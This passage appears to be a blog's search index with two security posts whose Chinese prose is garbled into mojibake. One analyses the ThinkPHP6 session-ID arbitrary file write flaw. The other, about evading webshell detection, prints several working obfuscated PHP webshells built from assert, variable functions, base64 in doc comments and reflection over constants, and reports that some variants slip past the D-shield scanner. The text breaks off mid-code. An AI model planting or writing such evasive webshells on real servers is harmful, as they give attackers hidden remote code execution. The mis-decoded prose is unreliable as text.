<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>ThinkPHP6ä»»æ„æ–‡ä»¶æ“ä½œæ¼æ´åˆ†æ</title>
    <url>/2020/01/26/ThinkPHP6%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E6%9C%AC%E5%9C%B0%E5%A4%8D%E7%8E%B0/</url>
    <content><![CDATA[<p>è¿™ä¸ªæ´å‡ºæ¥ä¹Ÿæœ‰ä¸€æ®µæ—¶é—´äº†ï¼Œçœ‹äº†åˆ›å®‡çš„paperåè§‰å¾—è›®ç®€å•çš„ï¼Œå†³å®šè‡ªå·±åœ¨æœ¬åœ°æ­å»ºå¤ç°ä¸€ä¸‹ï¼Œè®°å½•ä¸€ä¸‹å­¦ä¹ çš„è¿‡ç¨‹ã€‚</p>
<a id="more"></a>


<h1 id="ç¯å¢ƒå‡†å¤‡"><a href="#ç¯å¢ƒå‡†å¤‡" class="headerlink" title="ç¯å¢ƒå‡†å¤‡"></a>ç¯å¢ƒå‡†å¤‡</h1><p>apache + thinphp(&lt;=6.0.0ç‰ˆæœ¬&lt;=6.0.2) + php7ä»¥ä¸Š</p>
<ul>
<li>ThinkPHP6èµ·åªèƒ½ä½¿ç”¨composeræ¥å®‰è£…ï¼Œå®‰è£…composerã€phpã€apacheçš„è¿‡ç¨‹æˆ‘å°±ä¸èµ˜è¿°äº†ã€‚<br>æ‰§è¡Œå‘½ä»¤:<code>composer create-project topthink/think tp 6.0.0</code>ï¼Œå…¶ä¸­tpæ˜¯ä½ çš„æ–‡ä»¶å¤¹å‘½åï¼Œ6.0.0æ˜¯ç‰ˆæœ¬å·ï¼Œ6.0.1ä¹Ÿå¯ã€‚<br>è¿™é‡Œè¯´ä¸€ä¸ªé—®é¢˜ï¼Œæˆ‘è¿™ä¸ªæ—¶é—´Thinkphpçš„æœ€æ–°ç‰ˆæ˜¯6.0.2ï¼Œç”¨ä¸Šé¢çš„å‘½ä»¤ä¸‹è½½ä¸‹æ¥frameworkæ˜¯6.0.2ç‰ˆæœ¬çš„ï¼Œæˆ‘ä»¬éœ€è¦å†æ‰§è¡Œä¸€æ¡å‘½ä»¤ï¼š<code>composer require topthink/framework:6.0.0</code>ï¼šæ­¤æ—¶å°±ä¼šæŠŠå°†6.0.0çš„ç‰ˆæœ¬æŠŠ6.0.2ç»™æ›¿æ¢æ‰</li>
<li>è¿›å…¥tpçš„å®‰è£…ç›®å½•ï¼Œæ‰§è¡Œ<code>php think run</code>ï¼Œå®ƒä¼šå¼€å¯ä¸€ä¸ªä¸´æ—¶çš„å¼€å‘ç¯å¢ƒçš„æœåŠ¡å™¨ï¼Œé»˜è®¤è¿è¡Œåœ¨<code>localhost:8000</code>ï¼Œæ‰“å¼€æµè§ˆå™¨è®¿é—®æ˜¾ç¤ºæ­£å¸¸å³å¯<blockquote>
<p>æ¼æ´å¤ç°åœ¨apacheä¸‹è¿›è¡Œ</p>
</blockquote>
</li>
</ul>
<h1 id="æ¼æ´åˆ†æ"><a href="#æ¼æ´åˆ†æ" class="headerlink" title="æ¼æ´åˆ†æ"></a>æ¼æ´åˆ†æ</h1><p>æ¼æ´å½±å“çš„ç‰ˆæœ¬ï¼štop-think/framework 6.x &lt; 6.0.2</p>
<ul>
<li>å®˜æ–¹ä¿¡æ¯<br>ThinkPHPå‘å¸ƒçš„è¡¥ä¸å£°ç§°ä¿®å¤äº†ä¸€å¤„ç”±äºä¸å®‰å…¨çš„SessionIdå¯¼è‡´çš„ä»»æ„æ–‡ä»¶æ“ä½œæ¼æ´ï¼šåœ¨å¼€å¯Sessionçš„æƒ…å†µä¸‹å¯ä»¥å¯¼è‡´åˆ›å»ºä»»æ„æ–‡ä»¶ä»¥åŠåˆ é™¤ä»»æ„æ–‡ä»¶ï¼Œç‰¹å®šæƒ…å†µä¸‹å¯ä»¥getshell</li>
<li>æ ¹æ®è¿™äº›ä¿¡æ¯ï¼Œæˆ‘ä»¬åˆ°å®˜æ–¹GitHubçš„commité¡µé¢æ‰¾ä¸€ä¸‹ç›¸å…³çš„æäº¤è®°å½•ï¼š<br><img src="github.png" alt="github"></li>
</ul>
<p>å¯ä»¥çœ‹åˆ°ä½äºsrc/think/session/Store.phpä¸­212è¡Œåœ¨è®¾ç½®<code>id</code>æ—¶å¢åŠ äº†ä¸€ä¸ªå‡½æ•°ï¼š<code>ctype_alnum($text)</code>ã€‚<br>æŸ¥ä¸€ä¸‹PHPå®˜æ–¹æ‰‹å†Œï¼Œè¿™ä¸ªå‡½æ•°æ˜¯ç”¨æ¥æ£€æµ‹è¾“å…¥çš„<code>$text</code>ä¸­æ‰€æœ‰çš„å­—ç¬¦å…¨éƒ¨æ˜¯å­—æ¯å’Œ(æˆ–è€…)æ•°å­—ï¼Œè¿”å› TRUE å¦åˆ™è¿”å›FALSE<br><img src="ctype_alnum.png" alt="ctype_alnum"></p>
<p>æ ¹æ®æ–‡ä»¶ç›®å½•å’Œæ›´æ”¹çš„å‡½æ•°éƒ¨åˆ†çŒœæµ‹ï¼šå¯èƒ½æ˜¯å­˜å‚¨Sessionæ—¶å¯¼è‡´çš„æ–‡ä»¶å†™å…¥ï¼›ç„¶åè·Ÿè¿›æ‰¾ä¸€ä¸‹ç›¸å…³çš„å‡½æ•°ï¼Œå¯ä»¥çœ‹åˆ°<code>vendor/topthink/framework/src/think/session/Store.php:254</code>çš„save()å‡½æ•°ï¼Œ265è¡Œè¿˜å¯ä»¥å¯¹æ–‡ä»¶è¿›è¡Œåˆ é™¤æ“ä½œï¼Œå¹¶ä¸”å¯¹åç«¯ä¸šåŠ¡é€»è¾‘ä¾èµ–è¾ƒä½<br><img src="save.png" alt="save"></p>
<p>å¯ä»¥çœ‹åˆ°è®¾ç½®äº†$sessionIdï¼Œå¹¶ä¸”è°ƒç”¨äº†ä¸€ä¸ªwriteå‡½æ•°ï¼Œç»§ç»­è·Ÿè¿›ï¼Œæ‰¾åˆ°write()å‡½æ•°<code>vendor/topthink/framework/src/think/session/driver/File.php:210</code><br><img src="write.png" alt="write"></p>
<p>ç»§ç»­è·Ÿè¿›ï¼Œæ‰¾åˆ°writeFile()å‡½æ•°<br><img src="writeFile.png" alt="writeFile"></p>
<p>å¯ä»¥çœ‹åˆ°è°ƒç”¨äº†<code>file_put_contents()</code>å‡½æ•°ï¼Œè¿™é‡Œæ˜¯çœŸæ­£å†™å…¥æ–‡ä»¶çš„æ“ä½œäº†<br><img src="file_put_contents.png" alt="file_put_contents"></p>
<ul>
<li>æ¥ä¸‹æ¥æˆ‘ä»¬åå‘åˆ†æä¸€ä¸‹ï¼Œçœ‹çœ‹èƒ½ä¸èƒ½æ‰¾åˆ°å¯æ§ç‚¹</li>
</ul>
<ol>
<li>å‡½æ•°<code>file_put_contents($path,$content,LOCK_EX)</code>ä¸­å‚æ•°<code>$path,$content</code>æ¥æºäºå‡½æ•°<code>writeFile($path,$data)</code></li>
<li>å‡½æ•°<code>writeFile($path,$data)</code>ä¸­å‚æ•°<code>$path,$data</code>æ¥æºäºå‡½æ•°<code>write(String $sessionID,String $sessiData)</code></li>
<li>å‡½æ•°<code>write(String $sessionID,String $sessiData)</code>ä¸­å‚æ•°<code>$sessionID,$sessiData</code>æ¥æºäº<code>save()</code>ä¸­è°ƒç”¨äº†<code>write()</code>ï¼ŒåŒæ—¶ä¼ å…¥çš„å‚æ•°<code>$sessionId</code>çš„å€¼æ˜¯è°ƒç”¨<code>getId()</code>ä¼ å…¥çš„<br>ç»¼ä¸Šï¼šæ–‡ä»¶åæ¥æºäº<code>$sessionId</code></li>
</ol>
<ul>
<li><p>å½“ä¼ å…¥çš„idå€¼é•¿åº¦ä¸º32å¹¶ä¸”â€¦â€¦etcæ—¶ï¼Œåˆ›å»º<code>sessionId</code>ï¼Œç„¶åè¿›è¡Œ<code>gitId()</code><br><img src="session.png" alt="session"></p>
</li>
<li><p>æ¥ä¸‹æ¥æ‰¾è°ƒç”¨<code>setId()</code>çš„åœ°æ–¹<code>vendor/topthink/framework/src/think/middleware/SessionInit.php:46</code><br><img src="sessionI.png" alt="sessionI"><br>å…¶ä¸­<code>cookieName</code>çš„å€¼ä¸º<code>PHPSESSID</code>ï¼Œè€Œ<code>$sessionId</code>æ˜¯<code>cookie</code>ä¸­åä¸º<code>PHPSESSID</code>çš„å€¼ï¼Œå› æ­¤æ˜¯æ”»å‡»è€…å¯æ§çš„ï¼Œä»è€Œå¯¼è‡´å†™å…¥çš„æ–‡ä»¶åå¯æ§ã€‚<br>ä½†æ˜¯é»˜è®¤ç¯å¢ƒä¸‹ï¼Œ<code>session</code>çš„å†…å®¹ç”±<code>vendor/topthink/framework/src/think/session/Store.php:261</code>çš„å˜é‡<code>$data</code>ä¼ å…¥ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$data = <span class="keyword">$this</span>-&gt;serialize(<span class="keyword">$this</span>-&gt;data);</span><br></pre></td></tr></table></figure>
<p><code>$data</code>åœ¨é»˜è®¤ç¯å¢ƒä¸­ä¸ºç©ºï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Sessionæ•°æ®</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@var</span> array</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">protected</span> $data = [];</span><br></pre></td></tr></table></figure>
<p>å†™å…¥çš„<code>session</code>å†…å®¹æ˜¯ç”±å®é™…çš„åç«¯ä¸šåŠ¡é€»è¾‘æ¥å†³å®šçš„ï¼Œæ‰€ä»¥è¯´åªæœ‰è‹›åˆ»çš„æ¡ä»¶ä¸‹æ‰èƒ½å†™å…¥webshellã€‚å¹¶ä¸”ä¸€å¼€å§‹å°±è¯´äº†éœ€è¦åœ¨ç¯å¢ƒå¼€å¯<code>session</code>çš„æƒ…å†µä¸‹æ‰å¯ä»¥å®ç°ä»»æ„æ–‡ä»¶æ“ä½œ(é»˜è®¤ç¯å¢ƒä¸å¼€å¯session)</p>
</li>
<li><p>æˆ‘ä»¬åœ¨<code>app\controller\index.php</code>ä¸­å¢åŠ ä¸€äº›ä»£ç åï¼Œå¦‚ä¸‹ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">facade</span>\<span class="title">Session</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">app</span>\<span class="title">BaseController</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Index</span> <span class="keyword">extends</span> <span class="title">BaseController</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        Session::set(<span class="string">'name'</span>,<span class="string">'thinkphp'</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">'&lt;style type="text/css"&gt;*&#123; padding: 0; margin: 0; &#125; div&#123; padding: 4px 48px;&#125; a&#123;color:#2E5CD5;cursor: pointer;text-decoration: none&#125; a:hover&#123;text-decoration:underline; &#125; body&#123; background: #fff; font-family: "Century Gothic","Microsoft yahei"; color: #333;font-size:18px;&#125; h1&#123; font-size: 100px; font-weight: normal; margin-bottom: 12px; &#125; p&#123; line-height: 1.6em; font-size: 42px &#125;&lt;/style&gt;&lt;div style="padding: 24px 48px;"&gt; &lt;h1&gt;:) &lt;/h1&gt;&lt;p&gt; ThinkPHP V6&lt;br/&gt;&lt;span style="font-size:30px"&gt;13è½½åˆå¿ƒä¸æ”¹ - ä½ å€¼å¾—ä¿¡èµ–çš„PHPæ¡†æ¶&lt;/span&gt;&lt;/p&gt;&lt;/div&gt;&lt;script type="text/javascript" src="https://tajs.qq.com/stats?sId=64890268" charset="UTF-8"&gt;&lt;/script&gt;&lt;script type="text/javascript" src="https://e.topthink.com/Public/static/client.js"&gt;&lt;/script&gt;&lt;think id="eab4b9f840753f8e7"&gt;&lt;/think&gt;'</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">hello</span><span class="params">($name = <span class="string">'ThinkPHP6'</span>)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">'hello,'</span> . $name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


</li>
</ul>
<blockquote>
<p>å¿˜äº†è¯´äº†thinkphp6å¼€å¯sessionçš„æ–¹æ³•ï¼šåˆ é™¤<code>/app/middleware.php</code>æœ€åä¸€è¡Œçš„æ³¨é‡Š<br><img src="kq.png" alt="kq"></p>
</blockquote>
<h1 id="æœ¬åœ°ç¯å¢ƒå¤ç°"><a href="#æœ¬åœ°ç¯å¢ƒå¤ç°" class="headerlink" title="æœ¬åœ°ç¯å¢ƒå¤ç°"></a>æœ¬åœ°ç¯å¢ƒå¤ç°</h1><p>å¾ˆç®€å•ï¼Œåªéœ€è¦æ„é€ PHPSESSIDçš„å€¼å³å¯ï¼Œå€¼ä¸º<code>string</code>&amp;&amp;é•¿åº¦ä¸º32<br><img src="tp.png" alt="tp"><br>æ­¤æ—¶æŸ¥çœ‹ä¸€ä¸‹ç”Ÿæˆçš„sessionï¼Œç”Ÿæˆçš„sessionæ–‡ä»¶ä¿å­˜åœ¨<code>\runtime\session</code>ä¸‹<br><img src="sessionphp.png" alt="sessionphp"><br>sessioné‡Œçš„å†…å®¹:</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">a:1:&#123;s:4:"name";s:8:"thinkphp";&#125;</span><br></pre></td></tr></table></figure>
<p>å¯ä»¥çœ‹åˆ°sessionçš„å†…å®¹ç»è¿‡äº†åºåˆ—åŒ–æ“ä½œï¼Œåªè¦å°†sessionçš„å†…å®¹ååºåˆ—åŒ–å³å¯getshell</p>
<ul>
<li>å¦‚æœè¦getshellçš„è¯ï¼Œåç«¯éœ€è¦æœ‰ç±»ä¼¼çš„<code>Session::Set(&#39;name&#39;,$_POST[&#39;i&#39;])</code>ä»£ç æ‰å¯ä»¥åˆ©ç”¨</li>
</ul>
<h2 id="æ€»ç»“ï¼š"><a href="#æ€»ç»“ï¼š" class="headerlink" title="æ€»ç»“ï¼š"></a>æ€»ç»“ï¼š</h2><p>åœ¨å¤ç°çš„è¿‡ç¨‹ï¼Œä¹Ÿé‡åˆ°äº†ä¸å°‘é—®é¢˜ï¼šé¦–å…ˆThinkPHP6å¼€å§‹ä¸æ”¯æŒgitäº†ï¼Œåªèƒ½é€šè¿‡composeræ¥æ“ä½œï¼Œç”±äºä»æ¥æ²¡ç”¨è¿‡å®ƒä¹Ÿæ²¡ç»éªŒï¼Œä¸€å¼€å§‹å®‰è£…ç¯å¢ƒä¸€ç›´ä¸‹è½½ä¸åˆ°æ—§ç‰ˆæœ¬ï¼Œåæ¥å¾—åˆ°å¸ˆå‚…çš„å¸®åŠ©ç»ˆäºä¸‹å¥½äº†ThinkPHP6.0.0çš„ç¯å¢ƒï¼Œåœ¨è¿™é‡Œæ„Ÿè°¢ä¸€ä¸‹å¸ˆå‚…<a href="https://weibo.com/u/5332465356" target="_blank" rel="noopener">@P1an0</a>å¯¹æˆ‘çš„å¸®åŠ©ã€‚<br>è¿™ä¸ªæ¼æ´å…¶å®å¾ˆç®€å•ï¼Œå°±æ˜¯ç”¨æˆ·å¯æ§å˜é‡å¯¼è‡´çš„ï¼Œä¹Ÿæ²¡æœ‰å¯¹ä¸€äº›æ•°æ®çš„è¿‡æ»¤ç­‰ç­‰ã€‚éœ€è¦ä¸€å®šæ¡ä»¶æ‰å¯ä»¥åˆ©ç”¨ï¼Œä¹Ÿå°±æ˜¯å¼€å¯sessionï¼›å†™webshellè¿˜è¦çœ‹å…·ä½“çš„åç«¯ä¸šåŠ¡é€»è¾‘ç­‰ç­‰ã€‚æˆ‘è§‰å¾—å°±è¿™ä¸ªæ¡†æ¶æ¥çœ‹å…¶å®å¯ä»¥æ›´æ·±å…¥çš„è¿›è¡ŒæŒ–æ˜ï¼Œå¸Œæœ›æœ‰å¤§ä½¬å¯ä»¥å’Œæˆ‘ä¸€èµ·æ¢è®¨å­¦ä¹ </p>
<p>å‚è€ƒçš„paperï¼š<a href="https://paper.seebug.org/1114/" target="_blank" rel="noopener">ThinkPHP6 ä»»æ„æ–‡ä»¶æ“ä½œæ¼æ´åˆ†æ</a></p>
]]></content>
      <categories>
        <category>æ¼æ´åˆ†æ</category>
      </categories>
      <tags>
        <tag>ThinkPHP6</tag>
      </tags>
  </entry>
  <entry>
    <title>Webshellå…æ€çš„æ€è€ƒä¸å­¦ä¹ </title>
    <url>/2020/08/17/Webshell%E5%85%8D%E6%9D%80%E7%9A%84%E6%80%9D%E8%80%83%E4%B8%8E%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p><code>webshell</code>å¯¹äºæ¸—é€æµ‹è¯•è€…æ¥è¯´æ˜¯æ—¢æ˜¯ä¸€ç§ç»“æŸä¹Ÿæ˜¯ä¸€ç§å¼€å§‹ï¼›ä¸€ä¸ªå…æ€çš„<code>webshell</code>æ˜¯æˆ‘ä»¬åœ¨æ¸—é€æµ‹è¯•è¿‡ç¨‹ä¸­èƒ½å¦æ‹¿åˆ°ç›®æ ‡æƒé™çš„ä¸€ä¸ªâ€œå‰æâ€ï¼Œé¦–å…ˆwebshelléœ€è¦è½åœ°å­˜æ´»ï¼Œå…¶æ¬¡æ˜¯å¦èƒ½å¤Ÿæ‰§è¡Œå‘½ä»¤ï¼Œæœ€åæˆ‘ä»¬ä½¿ç”¨webshellç®¡ç†å·¥å…·æ—¶æµé‡æ˜¯å¦è¢«æ‹¦æˆªã€‚æ‰€ä»¥å…æ€è‡³å…³é‡è¦ã€‚</p>
<a id="more"></a>
<h1 id="æˆ‘çš„ç¬¬ä¸€ä¸ªä¸€å¥è¯æœ¨é©¬"><a href="#æˆ‘çš„ç¬¬ä¸€ä¸ªä¸€å¥è¯æœ¨é©¬" class="headerlink" title="æˆ‘çš„ç¬¬ä¸€ä¸ªä¸€å¥è¯æœ¨é©¬"></a>æˆ‘çš„ç¬¬ä¸€ä¸ªä¸€å¥è¯æœ¨é©¬</h1><p>å¾ˆå¥‡æ€ªï¼Œæˆ‘å­¦ä¹ å®‰å…¨æ¥è§¦çš„çš„ç¬¬ä¸€ä¸ªä¸€å¥è¯æœ¨é©¬å°±æ˜¯å®ƒï¼š<code>$_GET[1]($_POST[2]);</code>ï¼Œå¹¶ä¸”ä»¤æˆ‘å°è±¡æ·±åˆ»ã€‚å½“æ—¶ä¸å¤ªç†è§£è¿™ä¸ªæ˜¯å› ä¸ºPHPå¤ªçµæ´»äº†ï¼Œæ²¡æƒ³åˆ°è¿˜æœ‰è¿™ç§å†™æ³•ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$a = <span class="string">'assert'</span>;</span><br><span class="line">$a();</span><br></pre></td></tr></table></figure>
<p>è¿™ä¸ªæœ¨é©¬å’Œä¸Šé¢çš„ä¾‹å­ä¸€æ ·ï¼Œæ˜¯ä¸€ç§å¯å˜å‡½æ•°ï¼Œ<code>$_GET[1]</code>å†™ä¸ºå­—ç¬¦ä¸²<code>assert</code>ï¼Œ<code>$_POST[2]</code>å†™ä¸ºå‘½ä»¤<code>phpinfo()</code>ã€‚</p>
<ul>
<li><p>å€¼å¾—ä¸€æçš„æ˜¯assertå’Œevalï¼š<br>æ‰‹å†Œå†™åˆ°eval()ä¸æ˜¯ä¸€ä¸ªå‡½æ•°è€Œæ˜¯ä¸€ä¸ªè¯­è¨€æ„é€ å™¨ï¼Œæ‰€ä»¥ä¸èƒ½è¢«å¯å˜å‡½æ•°è°ƒç”¨ï¼›eval() æŠŠå­—ç¬¦ä¸²æŒ‰ç…§ PHP ä»£ç æ¥è®¡ç®—ã€‚è¯¥å­—ç¬¦ä¸²å¿…é¡»æ˜¯åˆæ³•çš„ PHP ä»£ç ï¼Œ<strong>ä¸”å¿…é¡»ä»¥åˆ†å·ç»“å°¾</strong>ã€‚<br>è€Œassert()æ˜¯ä¸€ä¸ªå‡½æ•°ï¼Œæ‰€ä»¥å®ƒç›¸æ¯”evalçµæ´»è®¸å¤šï¼Œå¯ä»¥è¢«å¯å˜å‡½æ•°è°ƒç”¨ï¼Œä¹Ÿå¯ä»¥è¢«å›è°ƒå‡½æ•°æ¥è°ƒç”¨ã€‚</p>
<h2 id="æ€è€ƒ"><a href="#æ€è€ƒ" class="headerlink" title="æ€è€ƒ"></a>æ€è€ƒ</h2><p>æˆ‘ä»¬é€šè¿‡webshellæ‰§è¡Œå‘½ä»¤ï¼Œæ˜¯é€šè¿‡æˆ‘ä»¬å¯æ§çš„å‚æ•°æ¥è¾¾åˆ°ç›®çš„ï¼Œè€Œä¸Šé¢çš„ä¸€å¥è¯æœ¨é©¬æˆ‘ä»¬å¯æ§çš„éƒ¨åˆ†ä¸ºPOSTå’ŒGETå‚æ•°ã€‚åªè¦ç¨ä½œæ”¹å˜å°±å¯ä»¥ç»•è¿‡Dç›¾çš„æ£€æµ‹</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">foreach</span> (<span class="keyword">array</span>(<span class="string">'_GET'</span>) <span class="keyword">as</span> $_request) &#123;</span><br><span class="line">    <span class="keyword">foreach</span> ($$_request <span class="keyword">as</span> $_key=&gt;$_value) &#123;</span><br><span class="line">        $$_key =  $_value;</span><br><span class="line">        $_key($_value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="1.png" alt=""></p>
</li>
<li><p>å¯ä»¥çœ‹åˆ°è¿™é‡Œå¹¶æ²¡æœ‰è¾¾åˆ°å…æ€æ•ˆæœ</p>
</li>
</ul>
<p><img src="D1.png" alt=""></p>
<ul>
<li>æ¥ä¸‹æ¥æˆ‘åˆå†™äº†ä¸€ä¸ªæ­£å¸¸çš„ç±»ä¸å‡½æ•°ï¼Œå†æ¬¡æ‰«æå‘ç°Dç›¾å·²ç»æ£€æµ‹ä¸å‡ºæ¥äº†</li>
</ul>
<p><img src="D2.png" alt=""></p>
<hr>
<p>ä»å¯å˜å‡½æ•°çš„ä¾‹å­æˆ‘ä»¬å¯ä»¥å—åˆ°ä¸€äº›å¯å‘ï¼Œé€šè¿‡ç¿»é˜…PHPæ‰‹å†Œä¸­çš„<strong>åå°„</strong>éƒ¨åˆ†ï¼Œæˆ‘ä»¬å¯ä»¥å¾—åˆ°ä¸€äº›å¯ä»¥åˆ©ç”¨çš„å‡½æ•°</p>
<h1 id="å°‘è§çš„å‡½æ•°"><a href="#å°‘è§çš„å‡½æ•°" class="headerlink" title="å°‘è§çš„å‡½æ•°"></a>å°‘è§çš„å‡½æ•°</h1><h2 id="è·å–æ³¨é‡Š"><a href="#è·å–æ³¨é‡Š" class="headerlink" title="è·å–æ³¨é‡Š"></a>è·å–æ³¨é‡Š</h2><p>PHPä¸­æœ‰è¿™æ ·ä¸€ä¸ªå‡½æ•°ï¼Œå®ƒå¯ä»¥è·å–phpæ³¨é‡Šçš„å†…å®¹<br><code>public ReflectionClass::getDocComment( void) : string</code><br>æŸäº›æŸ¥æ€å¼•æ“åœ¨æŸ¥æ€çš„æ—¶å€™ï¼Œä¼šåšç±»ä¼¼äºç¼–è¯‘å™¨çš„ä¼˜åŒ–ï¼Œå»æ‰æˆ‘ä»¬æ‰€å†™çš„æ³¨é‡Šã€‚æ¯•ç«Ÿæ³¨é‡Šæ˜¯ä¸èƒ½è¿è¡Œçš„ï¼Œå¦‚æœæˆ‘ä»¬å°†å‚æ•°é€šè¿‡éå¸¸è§„çš„æ–¹å¼ä¼ è¾“è¿›æ¥ï¼Œè¿™æ ·æˆ–è®¸å¯ä»¥ç»•è¿‡ä¸€äº›æŸ¥æ€å¼•æ“å‘¢ã€‚æˆ‘ä»¬çŸ¥é“ï¼Œå®‰å…¨ç‹—æŸ¥å½¢ï¼ŒDç›¾æŸ¥å‚ï¼Œå°±æ‹¿Dç›¾æ¥è¯•ä¸€è¯•ã€‚</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">* YXNzZXJ0YWE=</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Example</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">fn</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$reflector = <span class="keyword">new</span> ReflectionClass(<span class="string">'Example'</span>);</span><br><span class="line"></span><br><span class="line">$zhushi = substr(($reflector-&gt;getDocComment()), <span class="number">7</span>, <span class="number">12</span>);</span><br><span class="line">$zhushi = base64_decode($zhushi);</span><br><span class="line">$zhushi = substr($zhushi, <span class="number">0</span>, <span class="number">6</span>);</span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="keyword">foreach</span> (<span class="keyword">array</span>(<span class="string">'_POST'</span>,<span class="string">'_GET'</span>) <span class="keyword">as</span> $_request) &#123;</span><br><span class="line">    <span class="keyword">foreach</span> ($$_request <span class="keyword">as</span> $_key=&gt;$_value) &#123;</span><br><span class="line">        $$_key=  $_value;</span><br><span class="line">        print_r($$_request);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$zhushi($_value);</span><br></pre></td></tr></table></figure>
<p><img src="D3.png" alt=""></p>
<h2 id="è·å–å®šä¹‰è¿‡çš„ä¸€ä¸ªå¸¸é‡"><a href="#è·å–å®šä¹‰è¿‡çš„ä¸€ä¸ªå¸¸é‡" class="headerlink" title="è·å–å®šä¹‰è¿‡çš„ä¸€ä¸ªå¸¸é‡"></a>è·å–å®šä¹‰è¿‡çš„ä¸€ä¸ªå¸¸é‡</h2><p><code>public ReflectionClass::getConstants(void) : array</code><br>è·å–æŸä¸ªç±»çš„å…¨éƒ¨å·²å®šä¹‰çš„å¸¸é‡ï¼Œä¸ç®¡å¯è§æ€§å¦‚ä½•å®šä¹‰ã€‚ </p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">const</span> a = <span class="string">'As'</span>;</span><br><span class="line">    <span class="keyword">const</span> b = <span class="string">'se'</span>;</span><br><span class="line">    <span class="keyword">const</span> c = <span class="string">'rt'</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$para1;</span><br><span class="line">$para2;</span><br><span class="line">$reflector = <span class="keyword">new</span> ReflectionClass(<span class="string">'Test'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> ($i=<span class="number">97</span>; $i &lt;= <span class="number">99</span>; $i++) &#123;</span><br><span class="line">    $para1 = $reflector-&gt;getConstant(chr($i));</span><br><span class="line">    $para2.=$para1;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span> (<span class="keyword">array</span>(<span class="string">'_POST'</span>,<span class="string">'_GET'</span>) <span class="keyword">as</span> $_request) &#123;</span><br><span class="line">    <span class="keyword">foreach</span> ($$_request <span class="keyword">as</span> $_key=&gt;$_value) &#123;</span><br><span class="line">        $$_key=  $_value;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$para2($_value);</span><br></pre></td></tr></table></figure>
<p><img src="D4.png" alt=""></p>
<h2 id="è·å–ä¸€ç»„å¸¸é‡"><a href="#è·å–ä¸€ç»„å¸¸é‡" class="headerlink" title="è·å–ä¸€ç»„å¸¸é‡"></a>è·å–ä¸€ç»„å¸¸é‡</h2><p><code>public ReflectionClass::getConstants(void) : array</code><br>è·å–æŸä¸ªç±»çš„å…¨éƒ¨å·²å®šä¹‰çš„å¸¸é‡ï¼Œä¸ç®¡å¯è§æ€§å¦‚ä½•å®šä¹‰ã€‚ </p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">const</span> a = <span class="keyword">array</span>(<span class="number">1</span>=&gt;<span class="string">'aS'</span>,<span class="number">2</span>=&gt;<span class="string">'se'</span>,<span class="number">3</span>=&gt;<span class="string">'rT'</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span 